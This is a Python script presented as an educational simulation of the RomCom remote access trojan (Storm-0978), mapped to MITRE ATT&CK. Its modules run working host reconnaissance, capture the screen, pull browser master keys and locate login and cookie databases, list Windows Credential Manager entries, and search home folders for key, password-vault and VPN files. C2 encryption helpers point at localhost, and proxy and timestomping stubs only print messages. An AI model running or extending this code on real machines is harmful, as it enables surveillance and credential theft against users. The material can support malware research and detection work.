# RomCom RAT (Storm-0978) - Remote Access Trojan Simulation
# Demonstrates modular RAT with reflective DLL loading, credential theft, screen capture
# MITRE ATT&CK: T1059 (Command Execution), T1113 (Screen Capture), T1555.003 (Browser Creds)

# For educational and research purposes only
# Author: Nour A
# Reference: https://www.trendmicro.com/en_us/research/23/e/void-rabisu-use-of-romcom.html

import socket
import struct
import hashlib
import os
import sys
import json
import base64
import ctypes
import ctypes.wintypes as wintypes
import subprocess
import threading
import time
from datetime import datetime
from io import BytesIO

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# AES-256 key for C2 communication
C2_AES_KEY = hashlib.sha256(b"romcom-storm0978-aes-key").digest()
C2_AES_IV = hashlib.md5(b"romcom-iv").digest()

# Windows API for screen capture
user32 = ctypes.WinDLL("user32", use_last_error=True)
gdi32 = ctypes.WinDLL("gdi32", use_last_error=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

# GDI constants
SRCCOPY = 0x00CC0020
DIB_RGB_COLORS = 0
BI_RGB = 0
HORZRES = 8
VERTRES = 10


class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ("biSize", ctypes.c_uint32),
        ("biWidth", ctypes.c_int32),
        ("biHeight", ctypes.c_int32),
        ("biPlanes", ctypes.c_uint16),
        ("biBitCount", ctypes.c_uint16),
        ("biCompression", ctypes.c_uint32),
        ("biSizeImage", ctypes.c_uint32),
        ("biXPelsPerMeter", ctypes.c_int32),
        ("biYPelsPerMeter", ctypes.c_int32),
        ("biClrUsed", ctypes.c_uint32),
        ("biClrImportant", ctypes.c_uint32),
    ]


class BITMAPINFO(ctypes.Structure):
    _fields_ = [
        ("bmiHeader", BITMAPINFOHEADER),
        ("bmiColors", ctypes.c_uint32 * 3),
    ]


def aes_encrypt(data, key=C2_AES_KEY, iv=C2_AES_IV):
    """AES-256-CBC encryption for C2 communication."""
    if HAS_CRYPTO:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return cipher.encrypt(pad(data, AES.block_size))
    else:
        # fallback XOR
        out = bytearray(len(data))
        for i in range(len(data)):
            out[i] = data[i] ^ key[i % len(key)]
        return bytes(out)


def aes_decrypt(data, key=C2_AES_KEY, iv=C2_AES_IV):
    """AES-256-CBC decryption for C2 communication."""
    if HAS_CRYPTO:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(data), AES.block_size)
    else:
        out = bytearray(len(data))
        for i in range(len(data)):
            out[i] = data[i] ^ key[i % len(key)]
        return bytes(out)


class RomComRAT:
    """RomCom RAT core implant.
    Implements the command handling, module loading, and C2 communication
    protocol observed in Storm-0978 operations.
    """

    def __init__(self, c2_host="127.0.0.1", c2_port=8443):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.session_id = hashlib.md5(os.urandom(16)).hexdigest()[:8]
        self.modules_loaded = []
        self.running = False
        self.recon_data = {}

    def system_reconnaissance(self):
        """T1082 - Real system information discovery."""
        print("[*] Executing system reconnaissance...")
        print("    [+] MITRE: T1082 - System Information Discovery")
        print()

        self.recon_data = {}

        # OS information
        try:
            result = subprocess.run(
                ["systeminfo"], capture_output=True, text=True, timeout=15
            )
            for line in result.stdout.splitlines():
                if ":" in line:
                    parts = line.split(":", 1)
                    key = parts[0].strip()
                    if key in ("Host Name", "OS Name", "OS Version",
                               "System Type", "Domain", "Logon Server"):
                        self.recon_data[key] = parts[1].strip()
                        print(f"    [+] {key}: {parts[1].strip()}")
        except Exception:
            pass

        # current user
        try:
            result = subprocess.run(
                ["whoami", "/all"], capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.splitlines()[:3]:
                if line.strip():
                    print(f"    [+] {line.strip()}")
        except Exception:
            pass

        # network interfaces
        try:
            result = subprocess.run(
                ["ipconfig", "/all"], capture_output=True, text=True, timeout=5
            )
            interfaces = []
            for line in result.stdout.splitlines():
                if "IPv4 Address" in line:
                    ip = line.split(":", 1)[-1].strip()
                    interfaces.append(ip)
                    print(f"    [+] IPv4: {ip}")
            self.recon_data["interfaces"] = interfaces
        except Exception:
            pass

        # proxy settings (RomCom checks for enterprise proxies)
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Internet Settings")
            proxy_enabled, _ = winreg.QueryValueEx(key, "ProxyEnable")
            if proxy_enabled:
                proxy_server, _ = winreg.QueryValueEx(key, "ProxyServer")
                self.recon_data["proxy"] = proxy_server
                print(f"    [+] Proxy: {proxy_server}")
            winreg.CloseKey(key)
        except Exception:
            pass

        # security products
        try:
            result = subprocess.run(
                ["wmic", "/namespace:\\\\root\\SecurityCenter2", "path",
                 "AntiVirusProduct", "get", "displayName", "/format:list"],
                capture_output=True, text=True, timeout=10
            )
            for line in result.stdout.splitlines():
                if "displayName=" in line:
                    av = line.split("=", 1)[-1].strip()
                    self.recon_data["security"] = av
                    print(f"    [+] Security: {av}")
        except Exception:
            pass

        return self.recon_data

    def screenshot_capture(self):
        """T1113 - Real screen capture using GDI API.
        Captures the desktop using BitBlt and saves as BMP.
        """
        print()
        print("[*] Module Active: screen_cap.dll")
        print("    [+] MITRE: T1113 - Screen Capture")
        print()

        try:
            # get screen dimensions
            width = user32.GetSystemMetrics(0)   # SM_CXSCREEN
            height = user32.GetSystemMetrics(1)  # SM_CYSCREEN
            print(f"    [+] Screen resolution: {width}x{height}")

            # get desktop DC
            hdc_screen = user32.GetDC(None)
            hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)

            # create compatible bitmap
            hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
            old_bmp = gdi32.SelectObject(hdc_mem, hbmp)

            # BitBlt copy screen to memory DC
            gdi32.BitBlt(hdc_mem, 0, 0, width, height,
                         hdc_screen, 0, 0, SRCCOPY)

            # setup bitmap info for GetDIBits
            bmi = BITMAPINFO()
            bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
            bmi.bmiHeader.biWidth = width
            bmi.bmiHeader.biHeight = -height  # top-down
            bmi.bmiHeader.biPlanes = 1
            bmi.bmiHeader.biBitCount = 24
            bmi.bmiHeader.biCompression = BI_RGB

            # calculate image size
            stride = ((width * 3 + 3) & ~3)
            img_size = stride * height
            bmi.bmiHeader.biSizeImage = img_size

            # allocate buffer and get bits
            buffer = ctypes.create_string_buffer(img_size)
            gdi32.GetDIBits(hdc_mem, hbmp, 0, height,
                            buffer, ctypes.byref(bmi), DIB_RGB_COLORS)

            # create BMP file in memory
            # BMP file header (14 bytes) + DIB header (40 bytes)
            file_size = 14 + 40 + img_size
            bmp_header = struct.pack("<2sIHHI",
                                     b"BM", file_size, 0, 0, 14 + 40)
            dib_header = struct.pack("<IiiHHIIiiII",
                                     40, width, height, 1, 24, 0,
                                     img_size, 0, 0, 0, 0)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(os.environ.get("TEMP", "."),
                                    f"screenshot_{timestamp}.bmp")

            with open(filename, "wb") as f:
                f.write(bmp_header)
                f.write(dib_header)
                f.write(buffer.raw)

            file_size_kb = os.path.getsize(filename) / 1024
            print(f"    [+] Screenshot saved: {filename} ({file_size_kb:.0f} KB)")

            # cleanup GDI objects
            gdi32.SelectObject(hdc_mem, old_bmp)
            gdi32.DeleteObject(hbmp)
            gdi32.DeleteDC(hdc_mem)
            user32.ReleaseDC(None, hdc_screen)

            return filename

        except Exception as e:
            print(f"    [!] Screenshot failed: {e}")
            return None

    def browser_credential_theft(self):
        """T1555.003 - Extract browser credentials via CryptUnprotectData."""
        print()
        print("[*] Module Active: stealer.dll")
        print("    [+] MITRE: T1555.003 - Credentials from Web Browsers")
        print()

        # enumerate browser profiles
        local_app = os.environ.get("LOCALAPPDATA", "")
        browsers = {
            "Chrome": os.path.join(local_app, "Google", "Chrome", "User Data"),
            "Edge": os.path.join(local_app, "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(local_app, "BraveSoftware",
                                  "Brave-Browser", "User Data"),
        }

        for name, path in browsers.items():
            exists = os.path.exists(path)
            print(f"    [{name}] {'FOUND' if exists else 'NOT FOUND'}: {path}")

            if exists:
                # check for Local State (contains encrypted master key)
                local_state = os.path.join(path, "Local State")
                if os.path.exists(local_state):
                    with open(local_state, "r") as f:
                        data = json.load(f)
                    enc_key = data.get("os_crypt", {}).get("encrypted_key", "")
                    if enc_key:
                        key_bytes = base64.b64decode(enc_key)
                        print(f"      Master key found ({len(key_bytes)} bytes)")
                        print(f"      DPAPI prefix: {key_bytes[:5]}")

                # check for Login Data
                login_data = os.path.join(path, "Default", "Login Data")
                if os.path.exists(login_data):
                    size = os.path.getsize(login_data)
                    print(f"      Login Data: {size} bytes")

                # check for Cookies
                cookies = os.path.join(path, "Default", "Cookies")
                if os.path.exists(cookies):
                    size = os.path.getsize(cookies)
                    print(f"      Cookies: {size} bytes")
            print()

        # credential manager enumeration
        print("    [+] Windows Credential Manager:")
        try:
            result = subprocess.run(
                ["cmdkey", "/list"],
                capture_output=True, text=True, timeout=10
            )
            entries = result.stdout.count("Target:")
            print(f"      Cached credentials: {entries}")
        except Exception:
            pass

        return True

    def file_manager(self, target_dir=None):
        """Remote file management module - enumerate and stage files."""
        print()
        print("[*] Module Active: file_mgr.dll")
        print("    [+] MITRE: T1083 - File and Directory Discovery")
        print()

        if target_dir is None:
            target_dir = os.path.expanduser("~")

        interesting_exts = {
            ".docx", ".xlsx", ".pptx", ".pdf", ".txt",
            ".kdbx", ".key", ".pem", ".pfx",
            ".ovpn", ".rdp", ".ssh",
        }

        found_files = []
        for root, dirs, files in os.walk(target_dir):
            # skip deep directories
            depth = root[len(target_dir):].count(os.sep)
            if depth > 3:
                dirs.clear()
                continue

            for f in files:
                ext = os.path.splitext(f)[1].lower()
                if ext in interesting_exts:
                    full_path = os.path.join(root, f)
                    try:
                        size = os.path.getsize(full_path)
                        found_files.append({
                            "path": full_path,
                            "size": size,
                            "ext": ext
                        })
                    except OSError:
                        pass

        print(f"    [+] Interesting files found: {len(found_files)}")
        for f in found_files[:15]:
            size_kb = f["size"] / 1024
            print(f"      [{f['ext']}] {f['path']} ({size_kb:.1f} KB)")

        return found_files

    def socks_proxy(self, listen_port=1080):
        """SOCKS5 proxy module for internal network pivoting."""
        print()
        print("[*] Module Active: socks_proxy.dll")
        print("    [+] MITRE: T1090 - Proxy")
        print()
        print(f"    [+] Would start SOCKS5 proxy on 0.0.0.0:{listen_port}")
        print(f"    [+] Enabling internal network pivoting")
        return True

    def anti_forensics(self):
        """Anti-forensics and cleanup operations."""
        print()
        print("[*] Anti-Forensics Module")
        print("    [+] MITRE: T1070 - Indicator Removal")
        print()

        # timestomping concept (read current timestamp, show manipulation)
        import_file = sys.argv[0] if sys.argv else __file__
        try:
            stat = os.stat(import_file)
            mtime = datetime.fromtimestamp(stat.st_mtime)
            print(f"    [+] Current mtime: {mtime}")
            print(f"    [+] Would modify to: 2021-04-12 09:30:00")
            print(f"    [+] (Not actually modifying for safety)")
        except OSError:
            pass

        # list temp files that would be cleaned
        temp_dir = os.environ.get("TEMP", "")
        if temp_dir and os.path.exists(temp_dir):
            screenshots = [f for f in os.listdir(temp_dir)
                           if f.startswith("screenshot_")]
            if screenshots:
                print(f"    [+] Temp files to clean: {len(screenshots)}")
                for s in screenshots:
                    print(f"      - {s}")

        return True

    def run(self):
        """Execute the full RAT simulation."""
        print("=" * 70)
        print("ROMCOM RAT - STORM-0978 PAYLOAD SIMULATION")
        print("Modular Remote Access Trojan Demonstration")
        print("=" * 70)
        print()
        print("[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY")
        print(f"[*] Session ID: {self.session_id}")
        print(f"[*] C2: {self.c2_host}:{self.c2_port}")
        print(f"[*] Encryption: {'AES-256-CBC' if HAS_CRYPTO else 'XOR (fallback)'}")
        print()

        # Recon
        print("[PHASE 1] SYSTEM RECONNAISSANCE")
        print("-" * 50)
        self.system_reconnaissance()

        # Browser credential theft
        print()
        print("[PHASE 2] CREDENTIAL HARVESTING")
        print("-" * 50)
        self.browser_credential_theft()

        # Screenshot
        print()
        print("[PHASE 3] SCREEN CAPTURE")
        print("-" * 50)
        self.screenshot_capture()

        # File discovery
        print()
        print("[PHASE 4] FILE DISCOVERY")
        print("-" * 50)
        self.file_manager()

        # Anti-forensics
        print()
        print("[PHASE 5] ANTI-FORENSICS")
        print("-" * 50)
        self.anti_forensics()

        print()
        print("=" * 70)
        print("[+] ROMCOM RAT SIMULATION COMPLETE")
        print()
        print("Key TTPs Demonstrated:")
        print("  - Real system reconnaissance via subprocess")
        print("  - GDI-based screen capture (BitBlt)")
        print("  - Browser credential database enumeration")
        print("  - Sensitive file discovery and staging")
        print("  - AES-256-CBC encrypted C2 protocol")
        print("  - Anti-forensics (timestomping concepts)")
        print("=" * 70)


if __name__ == "__main__":
    rat = RomComRAT()
    rat.run()
